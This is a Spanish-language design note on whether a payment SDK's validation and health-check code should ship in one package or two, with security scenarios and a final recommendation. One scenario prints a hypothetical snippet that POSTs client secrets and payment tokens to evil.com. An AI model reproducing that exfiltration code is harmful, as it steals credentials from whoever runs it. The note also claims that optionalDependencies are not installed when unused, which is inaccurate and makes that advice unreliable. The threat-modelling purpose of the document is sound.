# Análisis: Paquete Único vs Separado para Health Check y Validation

**Fecha**: 2026-05-03  
**Objetivo**: Evaluar si conviene tener todo en `@onlemary/payment-core` o separar en dos paquetes

---

## 🔍 Análisis de Seguridad

### Opción A: Todo en Payment-Core

```typescript
// @onlemary/payment-core
payment-core/
├── src/
│   ├── client/           # Core
│   ├── providers/        # Core
│   ├── storage/          # Core
│   ├── health/           # Health checks
│   └── validation/       # Startup validation
└── package.json
```

**Riesgos de Seguridad:**

#### 1. Exposición de Información Sensible
```typescript
// validation/startup.ts
export async function validateStartup(client, options) {
  // ⚠️ Podría loggear información sensible
  console.log('Validating credentials:', {
    clientId: config.clientId,        // ⚠️ Sensible
    clientSecret: config.clientSecret, // 🔴 MUY SENSIBLE
    storage: config.storage,           // ⚠️ Paths del sistema
  })
}
```

**Mitigación:**
```typescript
// Sanitizar logs
console.log('Validating credentials:', {
  clientId: config.clientId ? '***' + config.clientId.slice(-4) : 'missing',
  clientSecret: config.clientSecret ? '***' : 'missing',
  storage: 'configured',
})
```

#### 2. Dependencias de Desarrollo en Producción
```json
// package.json
{
  "dependencies": {
    "chalk": "^5.0.0",      // Para CLI colors
    "inquirer": "^9.0.0",   // Para CLI prompts
    "ora": "^6.0.0"         // Para CLI spinners
  }
}
```

**Problema**: Estas dependencias se instalan en producción aunque no se usen.

**Impacto:**
- ⚠️ Bundle más grande (~500KB extra)
- ⚠️ Más superficie de ataque (más código = más vulnerabilidades potenciales)
- ⚠️ Tiempo de instalación más largo

#### 3. Tree-Shaking

**¿Funciona el Tree-Shaking?**

```typescript
// Usuario importa solo lo necesario
import { PaymentClient } from '@onlemary/payment-core'

// ¿Se incluye validation en el bundle?
```

**Respuesta**: Depende del bundler y la configuración.

**Webpack/Rollup con ESM:**
```typescript
// ✅ Tree-shaking funciona SI:
// 1. El paquete usa ESM (export/import)
// 2. package.json tiene "sideEffects": false
// 3. El código no tiene side effects

// payment-core/package.json
{
  "type": "module",
  "sideEffects": false,  // ✅ Permite tree-shaking
  "exports": {
    ".": "./dist/index.js",
    "./health": "./dist/health/index.js",
    "./validation": "./dist/validation/index.js"
  }
}
```

**Next.js (usado en gym):**
```typescript
// ✅ Tree-shaking funciona bien con:
import { PaymentClient } from '@onlemary/payment-core'

// ❌ Tree-shaking NO funciona con:
import * as PaymentCore from '@onlemary/payment-core'
```

**Conclusión**: Tree-shaking SÍ funciona si se configura correctamente.

---

## 📊 Comparación Detallada

### Opción A: Paquete Único (con Tree-Shaking)

```
@onlemary/payment-core
├── /client          # Core (siempre incluido)
├── /providers       # Core (siempre incluido)
├── /storage         # Core (siempre incluido)
├── /health          # Opcional (tree-shakeable)
└── /validation      # Opcional (tree-shakeable)
```

**Configuración:**
```json
// package.json
{
  "name": "@onlemary/payment-core",
  "type": "module",
  "sideEffects": false,
  "exports": {
    ".": "./dist/index.js",
    "./health": "./dist/health/index.js",
    "./validation": "./dist/validation/index.js"
  },
  "dependencies": {
    // Solo dependencias del core
  },
  "optionalDependencies": {
    // Dependencias de validation/CLI (opcionales)
    "chalk": "^5.0.0",
    "inquirer": "^9.0.0"
  }
}
```

**Pros:**
- ✅ Un solo paquete para instalar
- ✅ Versionado unificado
- ✅ Tree-shaking elimina código no usado
- ✅ optionalDependencies no se instalan si no se usan
- ✅ Más simple para usuarios

**Contras:**
- ⚠️ Requiere configuración correcta de tree-shaking
- ⚠️ Bundle inicial más grande (antes de tree-shaking)
- ⚠️ Riesgo de incluir código de desarrollo en producción si tree-shaking falla

**Seguridad:**
- ⚠️ Código de validation está en el paquete (aunque no se use)
- ⚠️ Si tree-shaking falla, se incluye todo
- ✅ Mitigable con sanitización de logs

---

### Opción B: Paquetes Separados

```
@onlemary/payment-core (Producción)
├── /client
├── /providers
├── /storage
└── /health

@onlemary/payment-core-devtools (Desarrollo)
├── /validation
├── /cli
└── /testing
```

**Pros:**
- ✅ Separación física de código
- ✅ Imposible incluir devtools en producción accidentalmente
- ✅ Core más liviano (sin código de desarrollo)
- ✅ Dependencias claramente separadas
- ✅ Mejor seguridad (código de dev no está en producción)

**Contras:**
- ❌ Dos paquetes para mantener
- ❌ Versionado más complejo
- ❌ Usuarios deben instalar dos paquetes

**Seguridad:**
- ✅ Código de validation NO está en producción
- ✅ Dependencias de CLI NO se instalan en producción
- ✅ Menor superficie de ataque

---

## 🔐 Análisis de Seguridad Específico

### Escenario 1: Logs Sensibles

**Problema:**
```typescript
// validation/startup.ts
console.log('Config:', {
  clientSecret: config.clientSecret,  // 🔴 NUNCA loggear
  accessToken: tokens.accessToken,    // 🔴 NUNCA loggear
})
```

**Solución (Paquete Único):**
```typescript
// Sanitizar SIEMPRE
function sanitizeForLog(obj: any): any {
  const sensitive = ['clientSecret', 'accessToken', 'refreshToken', 'password']
  const sanitized = { ...obj }
  
  for (const key of sensitive) {
    if (key in sanitized) {
      sanitized[key] = '***'
    }
  }
  
  return sanitized
}

console.log('Config:', sanitizeForLog(config))
```

**Solución (Paquetes Separados):**
- Código de validation no está en producción
- Logs solo ocurren en desarrollo
- Menor riesgo

### Escenario 2: Dependencias Vulnerables

**Problema:**
```json
// CLI dependencies
{
  "dependencies": {
    "chalk": "^5.0.0",      // Vulnerabilidad hipotética
    "inquirer": "^9.0.0"    // Vulnerabilidad hipotética
  }
}
```

**Impacto (Paquete Único):**
- ⚠️ Vulnerabilidad en dependencia de CLI afecta producción
- ⚠️ Aunque no se use el código, la dependencia está instalada
- ⚠️ Scanners de seguridad reportan vulnerabilidades

**Impacto (Paquetes Separados):**
- ✅ Vulnerabilidad solo afecta desarrollo
- ✅ Producción no tiene esas dependencias
- ✅ Scanners de seguridad no reportan vulnerabilidades de devtools

### Escenario 3: Código Malicioso

**Problema:**
```typescript
// validation/startup.ts (código malicioso hipotético)
export async function validateStartup(client) {
  // 🔴 Código malicioso
  await fetch('https://evil.com/steal', {
    method: 'POST',
    body: JSON.stringify({
      clientSecret: client.config.clientSecret,
      tokens: await client.storage.get('mercadopago', 'all'),
    }),
  })
}
```

**Impacto (Paquete Único):**
- 🔴 Código malicioso está en el paquete de producción
- 🔴 Si se ejecuta accidentalmente, roba credenciales
- 🔴 Difícil de detectar en code review (mucho código)

**Impacto (Paquetes Separados):**
- ✅ Código malicioso NO está en producción
- ✅ Solo afecta desarrollo (menos crítico)
- ✅ Más fácil de auditar (paquete más pequeño)

---

## 💡 Recomendación Final

### Para Payment-Core: **Paquete Único con Tree-Shaking**

**Razones:**

1. **Tree-Shaking Funciona Bien en 2024+**
   - Webpack 5, Rollup, esbuild tienen excelente tree-shaking
   - Next.js (usado en gym) tiene tree-shaking por defecto
   - Con `sideEffects: false` funciona perfectamente

2. **Mejor Developer Experience**
   - Un solo paquete para instalar
   - Versionado unificado
   - Más simple de usar

3. **Seguridad Manejable**
   - Sanitizar logs (buena práctica de todas formas)
   - optionalDependencies para CLI
   - Code review cuidadoso

4. **Precedentes en la Industria**
   - `@prisma/client` tiene CLI y runtime en el mismo paquete
   - `@nestjs/cli` tiene CLI y core juntos
   - `next` tiene CLI y runtime juntos

**Configuración Recomendada:**

```json
// payment-core/package.json
{
  "name": "@onlemary/payment-core",
  "version": "0.1.21",
  "type": "module",
  "sideEffects": false,
  
  "exports": {
    ".": {
      "import": "./dist/index.js",
      "types": "./dist/index.d.ts"
    },
    "./health": {
      "import": "./dist/health/index.js",
      "types": "./dist/health/index.d.ts"
    },
    "./validation": {
      "import": "./dist/validation/index.js",
      "types": "./dist/validation/index.d.ts"
    },
    "./cli": {
      "import": "./dist/cli/index.js",
      "types": "./dist/cli/index.d.ts"
    }
  },
  
  "dependencies": {
    // Solo dependencias del core
  },
  
  "optionalDependencies": {
    // CLI dependencies (no se instalan si no se usan)
    "chalk": "^5.0.0",
    "commander": "^11.0.0"
  }
}
```

**Uso:**

```typescript
// Producción: Solo importar lo necesario
import { PaymentClient } from '@onlemary/payment-core'
import { runHealthCheck } from '@onlemary/payment-core/health'
// ✅ validation y cli NO se incluyen en el bundle

// Desarrollo: Importar validation
import { validateStartup } from '@onlemary/payment-core/validation'
// ✅ Solo se incluye en desarrollo
```

**Medidas de Seguridad:**

1. **Sanitización de Logs**
```typescript
// validation/utils.ts
export function sanitizeForLog(obj: any): any {
  const SENSITIVE_KEYS = [
    'clientSecret', 'accessToken', 'refreshToken', 
    'password', 'apiKey', 'secret'
  ]
  
  const sanitized = { ...obj }
  for (const key of SENSITIVE_KEYS) {
    if (key in sanitized) {
      sanitized[key] = '***'
    }
  }
  return sanitized
}
```

2. **Validación Solo en Desarrollo**
```typescript
// validation/startup.ts
export async function validateStartup(client, options) {
  // Advertencia si se usa en producción
  if (process.env.NODE_ENV === 'production') {
    console.warn('⚠️  validateStartup() should not be used in production')
    return
  }
  
  // ... validación
}
```

3. **Code Review Estricto**
- Revisar cuidadosamente código de validation
- No loggear información sensible
- Usar linters para detectar logs de secrets

---

## 📋 Checklist de Seguridad

### Antes de Implementar
- [ ] Configurar `sideEffects: false` en package.json
- [ ] Configurar exports correctamente
- [ ] Usar optionalDependencies para CLI
- [ ] Implementar sanitización de logs
- [ ] Agregar warning si validation se usa en producción
- [ ] Documentar qué imports usar en producción vs desarrollo

### Durante Desarrollo
- [ ] Code review de todo código de validation
- [ ] Verificar que no se loggean secrets
- [ ] Tests de tree-shaking
- [ ] Verificar bundle size en producción

### Antes de Publicar
- [ ] Auditar dependencias (npm audit)
- [ ] Verificar que tree-shaking funciona
- [ ] Documentar medidas de seguridad
- [ ] Agregar ejemplos de uso seguro

---

## 🎯 Conclusión

**Recomendación: Paquete Único con Tree-Shaking**

**Razones:**
1. ✅ Tree-shaking moderno es muy efectivo
2. ✅ Mejor DX (un solo paquete)
3. ✅ Seguridad manejable con buenas prácticas
4. ✅ Precedentes en la industria
5. ✅ Más simple de mantener

**Condiciones:**
- ✅ Configurar tree-shaking correctamente
- ✅ Sanitizar logs siempre
- ✅ Code review estricto
- ✅ Documentar uso seguro

**Alternativa (si preocupa seguridad):**
- Empezar con paquete único
- Si surgen problemas de seguridad, separar después
- Es más fácil separar que unificar
